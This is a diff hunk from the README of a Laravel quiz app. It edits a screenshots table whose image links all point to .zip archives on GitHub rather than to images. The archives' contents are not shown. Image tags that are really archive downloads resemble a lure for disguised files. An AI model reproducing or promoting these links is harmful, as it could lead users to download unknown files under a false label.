@@ -17,7 +17,7 @@ An **interactive quiz platform** built with **Laravel 12** where users can:
 
 | Home Page                          | Quiz Page                          | Results Page                             |
 | ---------------------------------- | ---------------------------------- | ---------------------------------------- |
-| ![Home](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) | ![Quiz](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) | ![Results](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) |
+| ![Home](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/docs/srceenshorts/quizzy.zip) | ![Quiz](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) | ![Results](https://raw.githubusercontent.com/RafiBinWores/quizzy/main/ejective/quizzy.zip) |
 
 
 ---
